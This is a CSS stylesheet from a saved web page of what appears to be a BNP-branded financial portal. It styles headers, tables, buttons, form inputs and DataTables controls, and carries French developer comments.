  color: #0091de;
}
.vert {
  color: #7cbb00;
}
a.bleu { 
    font-weight:bold;
    text-decoration: none;
    color: #0091de;
}
.trad {
	display: inline;
}

/* bv 27/09/2016	balise h1 */
h1.trad {
	padding: 0px 0px 0px 0px;
	font-size: 11px;
	font-weight: normal;
	color: #586868;
}
h2.trad {
	font-size: 11px; 
	color: #586868; 
	font-weight: normal;
	padding: 0px 0px 0px 0px;
}


.tradsmall {
	display: inline;
	font-size: 9px;
}
hr {
  color: #0091de;
}
tr.clair {
  background-color: #ffffff !important;
}
tr.fonce {
  background-color: #e8e8e9 !important;
}
#cache {
	position:absolute; 
	left:360px; 
	top:0px; 
	z-index:10000;
}
/* Fin Style Général */

/* Bloc En-tête haut */
div.En-tete {
    right:0px;
    top:5px;
    width:957px;
    height:23px;
    font-size: 10px;
	display: table; /* ajout de cela car la hauteur de 23 est "fausse" */
	position: relative;
}

	div.En-tete div.item {
		display: inline-block;
		float:right;
		height:23px;
		margin-top: 3px;
		position: relative;
	}

	div.En-tete div.item.sepbleu {
		background: /*savepage-url=/tra_cosmos_img/separation_bleue.jpg*/ var(--savepage-url-11) 100% 3px no-repeat;
	}
	
		div.En-tete div.item.messagerie a {
			background: /*savepage-url=/tra_cosmos_img/messagerie_enveloppe.gif*/ url() no-repeat;
			width: 10px;
			display: inline-block;
		}
	
	div.En-tete div.item a {
		font-size: 10px;
		height:23px;
		text-transform: uppercase;
		padding: 0px 10px;
		font-weight: bolder;
		color: #0091de;
	}
	
div.header1-sepvert {
    float:right;
    height:23px;
    width: 5px;
    margin-top: 5px;
    background: /*savepage-url=/tra_cosmos_img/separation_verte.jpg*/ url() no-repeat;
}
div.header1-sepbleu {
    float:right;
    height:23px;
    width: 5px;
    margin-top: 5px;
    background: /*savepage-url=/tra_cosmos_img/separation_bleue.jpg*/ var(--savepage-url-11) no-repeat;
}
div.header1-01_ a, div.header1-02_ a, div.header1-03_ a, div.header1-04_ a, div.header1-05_ a, div.header1-06_ {
	font-size: 10px !important;
    float:right;
    top:0px;
    height:23px;
    text-transform: uppercase;
    padding: 3px 10px 0px 5px;
    font-weight: bolder;
}
div.header1-01_ a, div.header1-02_ a {
    color: #0091de !important;
}
div.header1-03_ a , div.header1-04_ a, div.header1-05_ a, div.header1-06_ a{
    color: #0091de !important;
/* modif 2012_07_09 BV suite à demande M. Berthet    color: #7cbb00 !important; */
}
.header1-05_ select {
  color: #586868;
  font-size: 10px !important;
  width: 110px;	
  font-weight: normal;
  float:right;
  margin:2px 10px 0px 0px;
  height:17px;
  text-transform: uppercase;
}

/* Fin Bloc En-tête haut */
/* Bloc logo acheteur*/
div.reverse_logo_acheteur {
    position:relative;
	top:40px;
	text-align:right;
	left: -10px;
}

/* Bloc En-tête logo */
div.Bando_logo {
    left:0px;
    top:0px;
    width: 931px;
    height: 59px;
    margin-left:13px;
    margin-right:13px;
    font-size: 12px;
    font-weight: bolder;
}
div.header2-seplogo {
    float:left;
    height:51px;
    width: 15px;
    background: /*savepage-url=/tra_cosmos_img/separation_logo_noire.jpg*/ url() no-repeat;
}
div.header2-02_ {
    float:left;
    top:0px;
    height:51px;
    padding: 14px 0px 5px 0px;
}
div.header2-03_ {
    float:left;
    top:0px;
    height:51px;
    padding: 0px 12px 0px 5px;
}
/* Fin Bloc En-tête logo */

/* Bloc Home */
div.decoupe-home-02_ {
    left:0px;
    top:240px;
    width:943px;
    height:240px;
}
div.contenu_home {
    left:13px;
    top:0px;
    width:943px;
    height:620px;
    margin-left:13px;
}
div.decoupe-home-03_ {
    float:left;
    min-height:480px;
    padding-left: 13px;
	width:340px;
    border: 3px solid #f3f3f3;
    background-color: #dfebf7;
}
div.decoupe-home-04_ {
    float:left;
    min-height:480px;
    width: 558px;
    margin-left: 4px;
    border: 3px solid #f3f3f3;
}

div.decoupe-home-05_ {
    width: 950px;
    padding-left: 10px;
}
div.decoupe-home-05_ table {
	text-align: center;
	margin-left:auto; 
	margin-right:auto;
}
/* Fin bloc Home */

/*
 *	SAI - 2015/10/16
 *	Problème de footer - pb js / doctype patché par un display table + margin pour ne pas refaire tous les js
 *	TD : I1510 592
 *	CLARITY : 5164220
 */
#contenu_global.contenu {display: table;  margin-bottom: 20px;}
html #conteneur2 div.footer_ {
	top: 0 !important;
	position: relative !important;
	margin-left: 0 !important;
	width: 957px !important;
	min-height: 40px;
}

	#conteneur2 div.footer_ a {
		display: inline-table;
		vertical-align: middle;
	}

/* Bloc Contenu */
div.contenu {
    position:relative;
    left:0px;
    top:0px;
    width:957px;
}
div.contenu-01_ {
    float:left;
    left:0px;
    top:0px;
}
div.contenu-02_ {
    float:left;
    width: 825px;
    padding: 0px 5px 5px 5px;
}
div.contenu-long-02_ {
/* permet de positionner le pied de page en base du texte lorsque celui-ci dépasse une page d'affichage */
    float:left;
    width:825px;
    padding:0;
}
#contenu-02_texte {
    font: 0.8em Arial, sans-serif;
    text-align:justify;
    width: 815px;
    color:#586868;
    padding:0px 0px 20px 20px;
}
div.contenu-02_texte li {
    margin-left:20px;
    list-style:/*savepage-url=/tra_cosmos_img/puce_vert_0015.gif*/url();
}
div.contenu-02_texte li#violet {
    margin-left:20px;
    list-style:/*savepage-url=/tra_cosmos_img/puce_0015.gif*/url();
}
div.contenu-03_ {
    float:left;
    width:190px;
    background: /*savepage-url=/tra_cosmos_img/contenu_03.jpg*/ url() no-repeat 0 top;
}
div.contenu-03_texte {
    font: 0.8em Arial, sans-serif;
    float:left;
    top:0px;
    width:110px;
    padding:90px 0 0 29px;
}
/* Fin Bloc Contenu */

/* Bloc Pied de page */
div.footer_ {
    clear:both;
    /*width:957px;*/
    /*height:30px; */
	min-height: 40px;
    font: bold 9px Arial, sans-serif;
    text-align:left;
    /*padding:0px 0px 20px 33px;*/
    position:relative;
    color:#707E87;
	padding: 10px 0px;
	text-align: center;
}

	div.footer_ table {
		margin: 0px auto;
		padding: 10px 0;
		text-align: left;
	}

div.footer_ a{
    text-decoration:none;
    color:#707E87;
}

	#pied #LANG_PROBCONNEXIONCONTACTNOTRE, #pied #LANG_WEBMASTER {
	    display: none;
	}

/* Fin Bloc Pied de page */

/* Bloc localisation */
.local_ {
    clear:both;
    padding: 10px 0px 0px 0px;
    height:10px; 
    color:#878787;
    font: bold 9px Arial, sans-serif;
}
.local_ a {
    color:#878787;
    text-decoration:none;
}
.local_ a:hover {
    text-decoration:underline;
}
/* Fin Bloc localisation */

/* Bloc Print */
span.print {
    color:#707E87;
}
span.print A:link {
    color:#707E87;
}
/* Fin Bloc Print */

/* css ancienne génération */
.p20l {
  font-size: 17px;
  font-weight: bold;
  padding-top: 10px;
  color: #7cbb00;
}

	/* SAI */
	h2.p20l {
		font-size: 17px;
		font-weight: bold;
		padding-top: 0px;
		color: #7CBB00;
	}
	
	h1.titreprincipal {
		font-size: 17px;
		font-weight: bold;
		padding-top: 0px;
		color: #7CBB00;
	}

.ll, td.ll, td.ll_minus {
    font-style: italic;
    font-size: 11px;
}
td.ll {
    text-transform: uppercase;
    color: #586868;
}
.ll_noitalic {
    font-style: normal !important;
    font-size: 11px;
}
.bloc_informations{
	width:340px;
}
.ll_noitalic a, .ll_noitalic a:hover {
  color: #586868;
  font-weight: normal;
  text-decoration: underline;
}
.lb_noitalic {
	font-size: 11px; 
	font-style: normal! important;
}
.lb_noitalic A {
	color: #586868; 
}
.lb_noitalic A:hover {
	color: #586868; 
	text-decoration: underline;
}
.lc_noitalic {
	text-align: center; 
	font-size: 11px; 
	font-style: normal! important;
}
.lc {
	text-align: center; 
	font-size: 11px; 
	font-style: italic;
}
.lc_small {
	text-align: center; 
	font-size: 9px; 
	font-style: italic:
}
.tln {
  text-transform: uppercase;
  text-align: right !important;
  font-size: 11px;
  color: #586868;
}
.pl, td.pl {
  text-transform: uppercase;
  text-align: left !important;
  font-size: 11px;
}
.pl {
  color: #7cbb00;
}
td.pl {
  color: #586868 !important;
}
input[type="text"] ,
input[type="password"]{
  border: solid #586868 1px;
  font-size: 11px;
  width: 210px;
  height: 18px;
  color: #586868;
}

	/* SAI modif pour les inputs */
	input[type="radio"], input[type="checkbox"] {
		width:auto;
		border: none;
		margin: 5px;
		vertical-align: middle;
	}
	
	input[type="text"].raw {
		width: auto;
	}

	input[type="file"] {
		width: auto;
		height: auto;
	}

input.ll_inputfile {
  font-style: normal !important;
	width: 400px;
	height: 24px !important;
	background-color: #ffffff; 
}
input.ll, input.lr, input.ll_select {
  font-style: normal !important;
}
input.ll_date {
  font-style: normal !important;
  width: 70px;
}
input.ll_check {
  border: 0px;
  width: 15px;
}
input.ll_verysmall {
  width: 34px;
}
input.ll_small, input.lr_small, input.fond_cr_small {
  width: 70px;
}
input.ll_ident {
  width: 120px;
}
input.ll_medium {
  width: 230px;
}
input.ll_long {
  width: 730px;
}
input.fond_cl, input.fond_cr, input.fond_cc, input.fond_cr_small {
  border: solid #e8e8e9 0px;
  background-color: #e8e8e9; 
  font-size: 10px;
  width: 210px;
  height: 18px !important;
  color: #586868;
}
select.ll_select  {
  color: #586868;
  font-size: 12px;
  width: 230px;
  height: 18px;
}
select.ll_select_small  {
  color: #586868;
  font-size: 12px;
  height: 18px !important;
  width: 70px;
}
textarea {
  border: solid #586868 1px;
  font-size: 12px;
  width: 700px;
  color: #586868;
  font-weight:bold;
  font: sans-serif !important;
}
textarea .contact {
	width: 500px;
}
.cc, .cl, .cr, .tc, .tl, .tr, .fond_cc, .fond_cl, .fond_cr {
  font-size: 10px;
  text-transform: uppercase;
}
.fond_cc, .fond_cl, .fond_cr {
  background-color: #e8e8e9;
  padding: 2px;
}
.cc, .tc, .fond_cc, input.fond_cc {
	text-align: center;
}
.cl, .tl, .fond_cl, input.fond_cl {
	text-align: left;
}
.cr, .tr, .fond_cr, input.fond_cr, input.fond_cr_small {
	text-align: right;
}
.cc, .cl, .cr {
  color: #586868;
}
.tc, .tr, .tl, .tic {
  background-color: #7cbb00;
  color: white !important;
}
/* ajout d'une class mini pour les trableaux trop gros */
.cc_mini, .cl_mini, .cr_mini, .tc_mini, .tl_mini, .tr_mini, .fond_cc_mini, .fond_cl_mini, .fond_cr_mini {
  font-size: 9px;
  text-transform: uppercase;
}
.fond_cc_mini, .fond_cl_mini, .fond_cr_mini {
  background-color: #e8e8e9;
  padding: 2px;
}
.cc_mini, .tc_mini, .fond_cc_mini, input.fond_cc_mini {
	text-align: center;
}
.cl_mini, .tl_mini, .fond_cl_mini, input.fond_cl_mini {
	text-align: left;
}
.cr_mini, .tr_mini, .fond_cr_mini, input.fond_cr_mini, input.fond_cr_small_mini {
	text-align: right;
}
.cc_mini, .cl_mini, .cr_mini {
  color: #586868;
}
.tc_mini, .tr_mini, .tl_mini, .tic_mini {
  background-color: #7cbb00;
  color: white !important;
}

.bouton_gris {
  background: /*savepage-url=/tra_cosmos_img/fond_bouton.jpg*/ url();
  /* border: 1px #185E86 solid; */
  text-transform: uppercase;
  height: 20px !important;
  font-size: 10px;
  padding:6px;
  text-align: center;
  display:inline;
  font-style:normal;
}
	a.bouton_gris {
	  color: #ffffff;
	}
	a:HOVER.bouton_gris {
	  color: #1A5E84;
	  text-decoration:none !important;
	}

	button.btnBNP,
		a.btnBNP {
		background-color: #A4A5A7;
		line-height: 24px;
		padding:0;
		border: none;
		color: #FFFFFF;
		text-transform: uppercase;
		font-size: 10px;
		padding: 0px 6px;
		margin: 4px;
		display: inline-block;
		min-height: 20px;
		line-height: 20px;
	}
		a.btnBNP:hover { text-decoration: none;}
	
		/* si deux boutons se suivent */
		button.btnBNP + button.btnBNP,
				a.btnBNP + a.btnBNP { margin-left: 0px;}

	button.btnDefault, a.btnDefault { font-weight: bold; }
		
	button.btnGris,
		a.btnGris {
		background-color: #A4A5A7;
		line-height: 24px;
		padding:0;
		border: none;
		color: #FFFFFF;
		text-transform: uppercase;
		font-size: 10px;
		padding: 0px 6px;
		margin: 4px;
	}

	button.btnGris:hover,
		a.btnGris:hover{
		color: #1A5E84;
		cursor: pointer;
	}

	button:disabled.btnGris
	{
		color: #FFFFFF;
		background-color: #D4D4D4;
		cursor: default;
	}

	button.btnGris[disabled="disabled"]
	{
		color: #FFFFFF;
		background-color: #D4D4D4;
		cursor: default;
	}
	
.bouton_bleu {
	background-color: #288AC7;
	text-transform: uppercase;
	font-size: 10px;
	font-style:normal;
	text-align: center;
	height: 24px;
	line-height: 24px;
	padding:6px;
	display:inline;
}
	a.bouton_bleu {
	  color: #ffffff;
	}
	a:HOVER.bouton_bleu {
	  background-color: #1A5E84;
	  text-decoration:none;
	}
	
	button.btnBleu {
		font-size: 10px;
		text-transform: uppercase;
		background-color: #0091DE;
		color: #FFFFFF;
		padding:0;
		border: none;
		padding: 0px 6px;
		margin: 4px;
		height: 24px;
		line-height: 24px;
	}
	
	button.btnBleu:hover {
		background-color: #1A5E84;
		cursor: pointer;
	}

	
	button.btnBleu[disabled="disabled"] {
		color: #FFFFFF;
		background-color: #D4D4D4;
		cursor: default;
	}
	
	button:disabled.btnBleu,
	button:disabled.btnBleu:hover {
		color: #FFFFFF;
		background-color: #D4D4D4;
		cursor: default;
	}
	
.pln {
    font-size: 10px;
    text-transform: uppercase;
    background-color: #7cbb00;
    color: #FFFFFF;
}
	/* SAI  */
	h3.pln {
		padding: 4px;
		text-transform: uppercase;
		background-color: #7CBB00;
		color: #FFFFFF;
	}

.plb {
    font-size: 10px;
    text-transform: uppercase;
    background-color: #0091de;
    color: #FFFFFF;    
}

.pldesactive {
	font-size: 15px;
	font-weight: bold;
	float: left;
}
.titre_parenthese {
	width: 650px;
	height: 24px;
}
.titre_parenthese .titre  {
	font-size: 15px;
	font-weight: bold;
	float: left;
	padding-top: 3px;
	text-transform: none;
}
.parenthese_ouvrante {
	background-repeat: no-repeat;
	height: 24px;
	width: 10px;
	float: left;
	background-image: /*savepage-url=/tra_cosmos_img/parenthese_ouvrante_0015.jpg*/ url();
}
.parenthese_fermante {
	float: left;
	background-repeat: no-repeat;
	height: 24px;
	width: 10px;
	background-image: /*savepage-url=/tra_cosmos_img/parenthese_fermante_0015.jpg*/ url();
}
.titre_parenthese_sur_2_cols {
	width: 350x;
	height: 24px;
	font-size: 15px;
}
.titre_parenthese_sur_2_cols .titre{
	font-size: 15px;
	font-weight: bold;
	float: left;
	padding-top: 3px;
	text-transform: none;
}

.titre_espace {
	padding: 15px 0px 0px 14px;
	font-size: 15px;
	font-weight: bold;
	text-transform: uppercase;
	color: #7cbb00;
}
.titre_ident {
	padding: 0px 20px 3px 0px;
	font-size: 25px;
	font-weight: bold;
	color: #0091de;
	display: block;
	text-align: right;
}
.titre_eve {
	padding: 15px 0px 3px 10px;
	font-size: 20px;
	font-weight: bold;
	color: #0091de;
}
/* bv 22/08/2016	balise h1 */
h1.titre_eve {
	padding: 0px 0px 0px 10px;
	font-size: 20px;
	font-weight: bold;
	color: #0091de;
}

.titre_sous_eve {
/* bv 24/05/2012	font-weight: bold; */
	font-size: 14px; 
	color: #0091de; 
	padding: 2px 0px 3px 0px;
}
/* bv 22/08/2016	balise h2 */
h2.titre_sous_eve {
/* bv 24/05/2012	font-weight: bold; */
	font-size: 14px; 
	color: #0091de; 
	font-weight: normal;
	padding: 0px 0px 0px 0px;
}

.titre_sous_eve2 {
	font-size: 13px; 
	color: #7CBB00; 
	padding: 5px 0px 3px 0px;
}

/* bv 22/08/2016	balise h3 */
h3.titre_sous_eve2 {
	font-size: 13px; 
	color: #7CBB00; 
	font-weight: normal;
	padding: 0px 0px 0px 0px;
}
/* bv 22/08/2016	balise h4 */
h4.titre_sous_eve2 {
	font-size: 11px; 
	color: #586868; 
	font-weight: normal;
	padding: 0px 0px 0px 0px;
}
.titre_eve_erreur{
	font-size: 14px;
	font-weight: bold;
}
.blabla_home {
	padding: 15px 0px 0px 10px; 
	font-family:Verdana, Arial, Helvetica, sans-serif;
}
.blabla_home_reverse {
	padding: 0px 0px 0px 5px; 
	font-family:Verdana, Arial, Helvetica, sans-serif;
}
.erreur {
	padding: 15px 5px 15px 5px; 
	width: 800px;
	font-size: 10px; 
	font-family: Verdana; 
	text-align: center; 
	border : solid 1px #586868;
}

ul.ll, ul.lldesactive, .ll ul {
	list-style-type: square;
	font-size: 11px; 
	font-style: normal;
	padding-top: 2px;
	padding-left: 15px;
}
.scroll_img {
	height: 300px; 
	width: 780px; 
	overflow: scroll;
}
.titre_menu, td.titre_menu, .titre_menu_desactive {
	color: #586868;
	font-size: 16px;
	padding-top: 15px;
	padding-right: 5px;
	padding-bottom: 5px;
	padding-left: 0px;
	font-weight: bold;
	width: 390px;
}
.ll_menu, td.ll_menu {
	font-size: 11px;
	font-weight: bold;
	font-style: normal;
	width: 390px;
	padding-left: 5px;
}

/* pour l'application GROUPE */
.ci {
	font-style: italic;
}
.tot {
	font-size: 11px;
  text-align: right;
}

/* pour COPILOTE */
.clairg {
  background-color: #ffffff !important;
  text-align: left;
}
.claird {
  background-color: #ffffff !important;
  text-align: right;
}
.fonceg {
  background-color: #e8e8e9 !important;
  text-align: left;
}
.fonced {
  background-color: #e8e8e9 !important;
  text-align: right;
}
.rar, .lr, .lr_small {
	text-align: right;
}
/* fin */


/* DataTables sorting */
.sorting_asc {
	cursor: pointer;
	background-image : /*savepage-url=/tra_cosmos_img/croissant.gif*/ url() no-repeat center left;
}
.sorting_desc {
	cursor: pointer;
	background-image : /*savepage-url=/tra_cosmos_img/decroissant.gif*/ url() no-repeat center right;
}
.sorting {
	cursor: pointer;
}
.sorting_asc_disabled {
	background-image : /*savepage-url=/tra_cosmos_img/decroissant.gif*/ url() no-repeat center right;
}
.sorting_desc_disabled {
	background-image : /*savepage-url=/tra_cosmos_img/croissant.gif*/ url() no-repeat center left;
}

#soldecompte div.dataTables_wrapper { min-height: auto; height: auto;}

.dataTables_filter {
  font-size: 11px;
  font: Arial, sans-serif;
  text-transform : uppercase;
}
.dataTables_paginate {
	width: 44px;
	float: right;
	text-align: right;
}
.paging_full_numbers {
	width: 300px;
	height: 22px;
	line-height: 22px;
	cursor: hand;
}
.paging_full_numbers span.paginate_button, .paging_full_numbers span.paginate_active,
.paging_full_numbers a.paginate_button, .paging_full_numbers a.paginate_active {
	border: 1px solid #aaa;
	padding: 2px 5px;
	margin: 0 3px;
}
.paging_full_numbers a:active {
	outline: none;
}
.paging_full_numbers a:hover {
	text-decoration: none;
}
.paging_full_numbers span.paginate_button, .paging_full_numbers a.paginate_button {
	background-color: #e8e8e9;
	color: #aaa;
}
.paging_full_numbers a.paginate_button:hover, a.paginate_button:hover {
	background-color: #7cbb00;
	color: #ffffff;
	text-decoration: none !important;
}
.paging_full_numbers span.paginate_active, .paging_full_numbers a.paginate_active {
	background-color:#7cbb00;
	color: #ffffff;
}
.paging_full_numbers a.paginate_button:hover {
	background-color: #7cbb00;
	color: #ffffff;
	text-decoration: none !important;
}

.dataTables_info {
  font-size: 11px;
  font-weight:bold;
  font: Arial, sans-serif;
  display:inline;
}

.dataTables_wrapper{
	padding-top: 1px;
}

/* DataTables Button */
div.DTTT_container {
	float: right;
	margin-bottom: 1em;
}
button.DTTT_button {
	position: relative;
  background-color:#a4a5a7 !important;
  color: #FFFFFF;
  cursor: pointer;
  text-transform: uppercase;
  height: 26px !important;
  font-size: 9px;
  padding:3px;
  font-family:Verdana, Arial, Helvetica, sans-serif;
  text-align: center;
  display:inline;
  font-style:bold;
  border: 1px #a4a5a7 solid;
  margin:2px;
}
button.DTTT_button::-moz-focus-inner { 
	border: none !important;
	padding: 0;
}
button.DTTT_button_csv {
	padding-right: 30px;
	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/csv.png*/ url() no-repeat center right;
}
button.DTTT_button_csv_hover {
  color: #000000;
	padding-right: 30px;
	border: 1px solid #999;
	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/csv_hover.png*/ url() no-repeat center right;
}
button.DTTT_button_pdf {
	padding-right: 30px;
	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/pdf.png*/ url() no-repeat center right;
}
button.DTTT_button_pdf_hover {
  color: #000000;
	padding-right: 30px;
	border: 1px solid #999;
	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/pdf_hover.png*/ url() no-repeat center right;
}
button.DTTT_button_print {
	padding-right: 30px;
	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/print.png*/ url() no-repeat center right;
}
button.DTTT_button_print_hover {
  color: #000000;
	padding-right: 30px;
	border: 1px solid #999;
	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/print_hover.png*/ url() no-repeat center right;
}
button.DTTT_button_collection {
	padding-right: 17px;
	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/collection.png*/ url() no-repeat center right;
}
button.DTTT_button_collection_hover {
  color: #000000;
	padding-right: 17px;
	border: 1px solid #999;
	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/collection_hover.png*/ url() no-repeat center right;
}

div.DTTT_collection {
	width: 150px;
	padding: 3px;
	border: 1px solid #ccc;
	background-color: #f3f3f3;
	overflow: hidden;
	z-index: 2002;
}
div.DTTT_collection_background {
	background: transparent /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/background.png*/ url() repeat top left;
	z-index: 2001;
}
div.DTTT_collection button.DTTT_button {
	float: none;
	width: 100%;
	margin-bottom: 2px;
	background-color: white;
}

.wait_page {
	text-align: center; 
	vertical-align: middle; 
	font-family: Arial; 
	color: #586868; 
	text-transform: uppercase;
	position: absolute; 
	top: 50%; 
	left: 50%; 
	margin-left: -88px; 
	font-size: 14px;	
}

#loaderLayer {
	position: fixed;
	top: 0;
	bottom: 0;
	left: 0;
	right: 0;
	background-color: rgba(0,0,0,0.1);
	z-index: 99;
}

#dvProgress {
	z-index : 10000; 
	background-color: white; 
	border : 1px solid #D1D2D4;
	border-radius: 4px;
	box-shadow: 0px 0px 10px rgba(0,0,0,0.5);
	padding : 15px 5px; 
	position: absolute;
	left: 50%;
	width: 200px;
	margin-left: -100px;
	top: 300px;
	text-align: center;
}

	#dvProgress img {
		width: 128px;
		height: 15px;
		background: /*savepage-url=/tra_cosmos_img/chargement_0001.gif*/ url() repeat-x;
		margin-top: 15px;
	}

/*
	SAI - Ajouts pour le profil
*/
#modalProfil input[type="radio"] {
	margin: 0 3px 0px 0px;
	padding: 0;
	vertical-align: middle;
}

#modalProfil p {
	line-height: 25px;
}

	/* style pour les onglets de la fenêtre de profil */
	#modalProfil .ui-tabs .ui-tabs-nav {padding: 0;}
	
	#modalProfil .ui-tabs .ui-tabs-nav li {
		margin: 0 0.2em 0px 0;
		border: 1px solid #dedede;
		/*border-bottom: 1px solid #CDCDCD !important;*/
		box-shadow: 0 -11px 9px -12px rgba(0, 0, 0, 0.4) inset;
		background-position: 0px 1px;
		background-color: #DDDFDE;
	}
		#modalProfil .ui-tabs .ui-tabs-nav li a {
			font-weight: normal;
			outline: 0; /* remove chrome blu outline on click */
		}
	
	#modalProfil .ui-tabs  .ui-tabs-nav li.ui-state-active,
	#modalProfil .ui-tabs .ui-tabs-nav li:hover	{
		border-color: #cdcdcd #cdcdcd #ffffff;
		border-style: solid;
		border-width: 1px;
		background-position: 0px 2px;
		box-shadow: none;
		border-bottom: 1px solid #ffffff !important;
		background-image: none;
	}
		#modalProfil .ui-tabs  .ui-tabs-nav li.ui-state-active { background-color: #FFFFFF; }
		#modalProfil .ui-tabs  .ui-tabs-nav li.ui-state-active a {font-weight: bold;}
	
	#modalProfil .ui-tabs .ui-tabs-panel {
		border: 1px solid #cdcdcd;
		padding: 10px;
	}
	
	/* profil collab */
	#collabDivTable { min-height: 100px; }
	
	#collabDivTable.loading {
		background: /*savepage-url=/tra_cosmos_img/loader/wait-7DBB00-64x64.gif*/ url() 50% 50% no-repeat;
	}
	
	div.jqi .jqibuttons button:hover,
	div.jqi .jqibuttons button:focus {
		background-color: #e7e7e7;
		cursor: pointer;
	}
	
.ProfileTextSize{
	font-size: 12px;
}

.jqititle{
	color: #7cbb00;
	text-align: center;
}

.jqibuttons{
	outline: none; /* suppresion du focus par défaut sur les liens*/
}

#ui-dialog-title-dialog-form{
	font-size: 16px;
}

	/* SAI pour décoller le contenu saisi du bord */
	input[type="text"].ll_inputProfile,
	input[type="password"].ll_inputProfile {
		padding: 0 6px; 
		margin-right: 5px;
	}
	
	/* SAI couleur de focus de l'input */
	input[type="text"].ll_inputProfile:focus,
	input[type="password"].ll_inputProfile:focus	{
		border-color: red;
		border-color: #459e00;
		border-width: 2px;
		box-shadow: 0 0 3px #459e00;
		background-color: #eae8e8;
		outline: 0;
	}

input.ll_inputProfile { 
  font-style: normal !important;
	height: 25px !important;
	background-color: #ffffff; 
}

.decaleContenuDebiteurInconnu{
	padding-left : 30px;
}
.decaleContenuDebiteurInconnuX2{
	padding-left : 50px;
}
.LienPageDebiteurInconnu a{
	color : #0091de;
	text-decoration: underline;
	outline: none; /* suppresion du focus par défaut sur les liens*/
}

ul#menu_gauche li#menug a,
ul#menu_gauche li.menug a {
	position: relative;
}

.messagerieIndicator {
	background-color: #E70000;
	border-radius: 4px;
	color: #FFF;
	font-size: 1.2em;
	font-weight: bold;
	height: 18px;
	line-height: 18px;
	position: absolute;
	right: 5px;
	text-align: center;
	width: 18px;
	box-shadow: 1px 1px 0px rgba(0, 0, 0, 0.3);
	display: none;
}

	div.En-tete span.messagerieIndicator {
		border-radius: 8px;
		font-size: 0.9em;
		height: 16px;
		line-height: 16px;
		right: 5px;
		margin-top: -7px;
		margin-right: -2px;
		width: 16px;
	}

/*SAI Fieldset & legend*/
fieldset.shadow {
    border: 1px solid #b1b1b1;
    border-radius: 4px;
    box-shadow: 0 0 3px 2px #EEEEEE;
	margin-top: 5px;
}
	fieldset.shadow legend {
	    background-color: #FFFFFF;
		color: #767676;
		font-size: 1.1em;
		letter-spacing: -1px;
		padding: 0 5px;
	}
	
/*
	classes de mise en forme de texte
*/
.lowercase {text-transform: lowercase;}
.uppercase {text-transform: uppercase;}
.capitalize {text-transform: capitalize;}
.capitalizeFirst:first-letter {text-transform: uppercase;}
.justify { text-align:justify; }

.bold {font-weight: bold;}
.italic{font-style: italic;}

.verticalAlign {vertical-align: middle;}

.alignLeft { text-align: left; }
.alignRight { text-align: right; }

.floatLeft { float: left; }
.floatRight { float: right; }

.display-table-cell {display: table-cell;}
.vertical-align-middle{vertical-align: middle;}

.BNPNotice {
	position: relative;
	margin: 5px 15px;
}
	.BNPNotice .BNPNoticeBodyClass {
		position: relative;
		border-radius: 7px;
/*		background-color: #828282;*/

		background: #606c88; /* Old browsers */
		background: -moz-linear-gradient(top, #606c88 0%, #3f4c6b 100%); /* FF3.6+ */
		background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#606c88), color-stop(100%,#3f4c6b)); /* Chrome,Safari4+ */
		background: -webkit-linear-gradient(top, #606c88 0%,#3f4c6b 100%); /* Chrome10+,Safari5.1+ */
		background: -o-linear-gradient(top, #606c88 0%,#3f4c6b 100%); /* Opera 11.10+ */
		background: -ms-linear-gradient(top, #606c88 0%,#3f4c6b 100%); /* IE10+ */
		/*background: linear-gradient(to bottom, #606c88 0%,#3f4c6b 100%); *//* W3C */
		filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#606c88', endColorstr='#3f4c6b',GradientType=0 ); /* IE6-9 */		
		
		color: #f9f9f9;
		font-size: 1.3em;
		padding: 0px;
	}

		.BNPNotice .BNPNoticeBodyClass>h1 {margin-top: 0px;}
	
	.BNPNotice .BNPNoticeButtonClose {
		position: absolute;
		right: 2px;
		top: 3px;
		color: #FFFFFF;
		line-height: 10px;
		width: 13px;
		height: 13px;
		text-align: center;
	}
		.BNPNotice .BNPNoticeButtonClose:hover {
			background-color: rgba(255,255,255,0.4);
			border-radius: 13px;
			
		}

	.BNPNotice.BNPNoticeClosed {
		display: none;
	}
	

	.BNPNotice .BNPNoticeButtonClose {
		cursor: pointer;
	}

	
	/*
	 * Style de base pour les tableaux
	 */
	 
	table.BNPTable {
		border-collapse: collapse;
		font-size: 10px;
		width: 100%;
	}
	
	table.BNPTable td {
		/*border: 2px solid #FFFFFF;*/
		/*padding: 5px;*/
		border-right: 1px solid #FFFFFF;
	}
	
	table.BNPTable thead tr th {
		background-color: #7CBB00;
		color: #FFFFFF;
		text-align: center;
		text-transform: uppercase;
		/*height: 20px;*/
		line-height: 30px;
		border-right: 1px solid #FFFFFF;
	}
	
		table.BNPTable thead tr th:last-child { border-right: none;}
	
	table.BNPTable thead tr td,
	table.BNPTable tbody tr td.tdTitre {
		background-color: #7CBB00;
		color: #FFFFFF;
		text-align: center;
		text-transform: uppercase;
		/*height: 20px;*/
		line-height: 30px;
	}
	
	table.BNPTable tbody tr {}
	
	table.BNPTable tbody tr td {
		background-color: #E8E8E9;
		color: #586868;
		/*height: 20px;*/
		padding: 5px;
		border-right: 1px solid #FFFFFF;
		border-bottom: 1px solid #FFFFFF;
		line-height: 30px;
	}
	
		table.BNPTable tbody td.number,
		table.BNPTable tfoot th.number{
			text-align: right;
		}
	
		table.BNPTable tbody td.center,
		table.BNPTable tfoot th.center {
			text-align: center;
		}
	
	table.BNPTable tfoot th { padding: 5px;font-size: 11px;}
	table.BNPTable tfoot tr td {}

	
	
	/*
	 * theme light
	 */
	table.BNPTable.BNPTableLight {
		border-collapse: collapse;
		/*border: 1px solid #EDEDED;*/
	}
	
	table.BNPTable.BNPTableLight td {
		border-top: none;
		border-left: none;
		border-right: none;
		border-bottom: 1px solid #D4D4D4;
	}
	
